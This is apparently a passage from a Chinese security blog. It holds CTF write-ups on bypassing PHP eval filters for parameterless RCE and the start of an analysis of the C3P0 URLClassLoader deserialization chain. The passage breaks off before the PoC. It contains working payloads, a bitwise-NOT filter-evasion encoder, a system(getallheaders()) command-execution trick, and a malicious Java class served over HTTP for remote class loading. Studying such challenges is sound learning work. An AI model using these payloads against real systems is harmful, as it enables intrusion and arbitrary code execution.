<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>构造”..”</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));<span class="comment">//我们scandir(getcwd())出现的数组第二个就是&quot;..&quot;，所以可以用next()获取</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));<span class="comment">//所以也可查看上级目录文件</span></span><br><span class="line">结合上文</span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))))也是可以得到的    </span><br></pre></td></tr></table></figure>

<h3 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h3><p>chdir() ：改变当前工作目录</p>
<p>直接print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p>
<p>所以使用chdir()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))))//即可改变当前目录为上一层目录并读取文件：</span><br></pre></td></tr></table></figure>

<p>如果不能使用dirname()，可以使用构造”..”的方式切换路径并读取：</p>
<p>但是这里切换路径后getcwd()和localeconv()不能接收参数，因为语法不允许，我们可以用之前的hebrevc(crypt(arg))</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line">或更复杂的：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line">还可以用：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))))))))));<span class="comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span></span><br></pre></td></tr></table></figure>

<p>还有一种构造方法if()：（这种更直观些，并且不需要找可接收参数的函数）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))))<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>

<h3 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>

<p>strrev(crypt(serialize(array())))所获得的字符串第一位有几率是&#x2F;，所以使用以上payload可以查看根目录文件</p>
<p>同样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></table></figure>

<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="title">chdir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">strrev</span>(<span class="title">crypt</span>(<span class="title">serialize</span>(<span class="title">array</span>())))))))<span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure>



<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__0ILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目给了源码,能代码执行eval,但是过滤了很多函数,命令执行函数system,passthru,</p>
<p>可以用其他函数命令执行,比如exec,反引号，其他在命令执行里面过滤了很多东西,一些简单的指令和一些字符 $,*, . ，+,^，</p>
<p>尝试了exec发现不应,应该是被禁用了</p>
<p>那就用反引号，printf(`dir`);	发现成功,最后按照正常方法做就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">printf(`ca<span class="string">&#x27;&#x27;</span>t /fffffffffflagafag`)就行了 这道题可以靠更难点</span><br></pre></td></tr></table></figure>



<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>git泄露读出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题过滤了et|na|info|dec|bin|hex|oct|pi|log&#x2F;i,那其实很简单,都可以命令执行了,过滤了getallheaders()，phpinfo()，get_defined_vars()，getenv(),hex2bin(),</p>
<p>getcwd()</p>
<p>已经include flag.php了那就读这个文件,session_id()没过滤,可以命令执行,读文件都可以读</p>
<p>因为session_id,没有被禁但是hex被禁了 正常情况下phpssionid其他特殊字符又只能读取 -和逗号 所以要么用其他函数转化但是这里又相当于过滤5了bindec(),otcdec()</p>
<p>decbin()所以走不通</p>
<p>那就只有读文件了,因为在当前目录所以</p>
<p>exp&#x3D;print_r(scandir(current(localeconv()))); </p>
<p>发现文件在倒数第二个位置</p>
<p>show_source(next(array_reverse(scandir(current(localeconv()))))就行了</p>
<h1 id="极客大挑战-2020-rceme"><a href="#极客大挑战-2020-rceme" class="headerlink" title="极客大挑战 2020 rceme"></a>极客大挑战 2020 rceme</h1><p>f12源码给了提示swp泄露了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个要步就是要绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这个code不知道是多少啊o(╥﹏╥)o找了半天发现在输入命令的下面</p>
<p>通过脚本就能跑过</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200000000</span>):</span><br><span class="line">    x=hashlib.md5(<span class="built_in">str</span>(i).encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (x[<span class="number">0</span>:<span class="number">5</span>]==a):</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后第二层</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))</span><br></pre></td></tr></table></figure>

<p>限制了长度，限制了不能输入字母数字和一些特殊字符,想到无字符rce,这里相当</p>
<p>与过滤了自增,异或，但是还有取反，又只有跑脚本了</p>
<p>第三层</p>
<p>需要无参数rce了,o(╥﹏╥)o</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;:&gt;&quot;</span>).strip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>最后构造执行命令的方法就行了var_dump(system(end(getallheaders())))</p>
<p><img src="https://baicany.github.io/images/image-20230625231856879.png" alt="image-20230625231856879"></p>
<p>ε&#x3D;(´ο｀*)))唉</p>
<p>用其他的没回显</p>
]]></content>
      <categories>
        <category>ctf记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>C3P0反序列化</title>
    <url>/2023/08/26/C3P0/</url>
    <content><![CDATA[<h1 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h1><p>C3P0是JDBC的一个连接池组件，使用它的开源项目有Hibernate、Spring等。</p>
<p>连接池：</p>
<blockquote>
<p>“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。<br>类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。”</p>
</blockquote>
<p>C3P0：</p>
<blockquote>
<p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p>
</blockquote>
<p><strong>依赖</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;dependency&gt;</span></span><br><span class="line">    <span class="section">&lt;groupId&gt;</span><span class="attribute">com</span>.mchange&lt;/groupId&gt;</span><br><span class="line">    <span class="section">&lt;artifactId&gt;</span><span class="attribute">c3p0</span>&lt;/artifactId&gt;</span><br><span class="line">    <span class="section">&lt;version&gt;</span><span class="attribute">0</span>.<span class="number">9</span>.<span class="number">5</span>.<span class="number">2</span>&lt;/version&gt;</span><br><span class="line"><span class="section">&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>这条链在许多文章中也被称为http base链。</p>
<p>在PoolBackedDataSourceBase类的writeObject方法中有如下内容</p>
<p><img src="https://baicany.github.io/images/image-20230830221340651.png" alt="image-20230830221340651"></p>
<p>该方法会尝试将当前对象的connectionPoolDataSource属性进行序列化，</p>
<p>但connectionPoolDataSource变量它是⼀个ConnectionPoolDataSource对象，这个接⼝并没有实现Serializable接口</p>
<p>也就是说，当connectionPoolDataSource不为null时，当触发序列化时，会由于这个对象没有实现Serializable接口，而抛出NotSerializableException异常，⾛catch代码块。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">var2</span> <span class="operator">=</span> ((Referenceable)var1).getReference();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>(var2, <span class="built_in">this</span>.name, <span class="built_in">this</span>.contextName, <span class="built_in">this</span>.environmentProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此方法会调用connectionPoolDataSource属性的getReference方法，</p>
<p>还会将connectionPoolDataSource变量进⾏强转<br>那么，当connectionPoolDataSource变量不为null，类型为ConnectionPoolDataSource时，获取<br>connectionPoolDataSource变量时，反序列化出来的会是⼀个ReferenceSerialized对象<br>序列化对象准备，因此我们需要准备⼀个PoolBackedDataSourceBase对象，对象提供setter⽅法，修改<br>connectionPoolDataSource变量为⼀个ConnectionPoolDataSource对象。由于需要强转的关系，还需要满⾜为<br>Referenceable对象。<br>由于在反序列化中，并没有用到这个类，所以我们可以自己实现这个类<br>那么我们就能自行实现getReference⽅法，返回⼀个可控的Reference对象</p>
<p>并用返回结果作为参数实例化一个ReferenceSerialized对象，然后将ReferenceSerialized对象返回，ReferenceSerialized被序列化。<br>下面是ReferenceSerialized构造方法，结合上文可以发现，其reference对象是人为可控的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) &#123;</span><br><span class="line">    <span class="built_in">this</span>.reference = var1;</span><br><span class="line">    <span class="built_in">this</span>.name = var2;</span><br><span class="line">    <span class="built_in">this</span>.contextName = var3;</span><br><span class="line">    <span class="built_in">this</span>.env = var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进PoolBackedDataSourceBase的readObject方法看看。</p>
<p><img src="https://baicany.github.io/images/image-20230830224556525.png" alt="image-20230830224556525"></p>
<p>可以看到会调用序列流中的对象的getObject方法，结合上文，如果ReferenceSerialized被序列化到了序列流中，而ReferenceSerialized implements IndirectlySerialized </p>
<p>那么这里可以是ReferenceSerialized#getObject，我们进行跟进。<br>跟进后可以发现调用了ReferenceableUtils.referenceToObject这个静态方法，再度进行跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.env == <span class="literal">null</span>) &#123;</span><br><span class="line">                    var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(<span class="built_in">this</span>.env);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Context</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.contextName != <span class="literal">null</span>) &#123;</span><br><span class="line">                    var2 = (Context)var1.lookup(<span class="built_in">this</span>.contextName);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">                <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="built_in">this</span>.reference, <span class="built_in">this</span>.name, var2, <span class="built_in">this</span>.env);</span><br><span class="line"><span class="comment">//                </span></span><br></pre></td></tr></table></figure>

<p>思考: 这里调用了lookup,能不能触发jndi注入呢，但是这里contextname并不可控就不行了</p>
<p>继续跟进referenceToObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var0.getFactoryClassName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> var0.getFactoryClassLocation();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var6</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> Class.forName(var4, <span class="literal">true</span>, (ClassLoader)var7);</span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">var9</span> <span class="operator">=</span> (ObjectFactory)var12.newInstance();</span><br></pre></td></tr></table></figure>

<p>获取⼯⼚地址，实例化URLClassLoader作为类加载器，在调⽤Class.forName时会加载指定URL所指向的类或资源，最后实例化这个类</p>
<p>只有当 initialize参数是true并且之前没有被初始化时，类才会被初始化。</p>
<p>这里reference是可控那么ref ClassName属性也是可控的,之前学过动态加载字节码的只是就知道这里newInstance就能利用来命令执行了,这里C3P0用的是urlclassload,而impl是用的defineClass,我们可以通过URLClassLoader实例化远程类，造成任意代码执行。</p>
<p>来看这个类的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">PoolBackedDataSourceBase</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">PoolBackedDataSourceBase</span><span class="params">(<span class="type">boolean</span> autoregister)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (autoregister) &#123;</span><br><span class="line">        <span class="built_in">this</span>.identityToken = C3P0ImplUtils.allocateIdentityToken(<span class="built_in">this</span>);</span><br><span class="line">        C3P0Registry.reregister(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>baicany类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">baicany</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javac编译后放到制定路径下</p>
<p>还需要注意，不能尝试在较低版本的 Java 运⾏时环境中运⾏⼀个使⽤更⾼版本编译的类，这会导致⽆法加载这个</p>
<p>类。其次是实例化时会进⾏强转，为了避免加载失败，可将恶意代码写进静态代码块中，在Class.forName处触</p>
<p>发。并且起个web访问放在指定目录下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>所以写poc</p>
